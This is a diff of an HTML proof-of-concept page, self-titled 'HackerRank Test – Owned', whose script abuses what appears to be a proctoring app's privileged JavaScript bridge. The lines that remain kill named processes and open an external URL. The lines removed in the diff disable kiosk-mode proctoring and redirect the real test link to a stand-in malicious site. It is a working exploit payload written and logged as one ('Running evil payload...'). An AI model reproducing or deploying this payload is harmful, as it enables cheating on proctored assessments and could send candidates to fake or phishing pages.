@@ -4,17 +4,10 @@
 <h2>HackerRank Test – Owned</h2>
 <pre id="log">Running evil payload...</pre>
 <script>
-// 1. Disable proctoring
-window.hackerranktest.unSetKioskMode();
-document.getElementById("log").textContent += "\n[+] Kiosk mode disabled (Alt+Tab works)";
 
 // 2. Kill anti-cheat tools
-window.hackerranktest.systemCheck.closeBlockedApps(["cluely","whatsapp"]);
+window.hackerranktest.systemCheck.closeBlockedApps(["cluely.exe","whatsapp"]);
 document.getElementById("log").textContent += "\n[+] cluely & whatsapp killed";
-
-// 3. Hijack the real test URL
-window.hackerranktest.setTestLink("https://your-evil-site.com/fake-test");
-document.getElementById("log").textContent += "\n[+] Next Continue button → goes to YOUR fake test";
 
 // 4. Open rickroll for fun
 window.hackerranktest.openExternalUrl("https://youtu.be/dQw4w9WgXcQ");
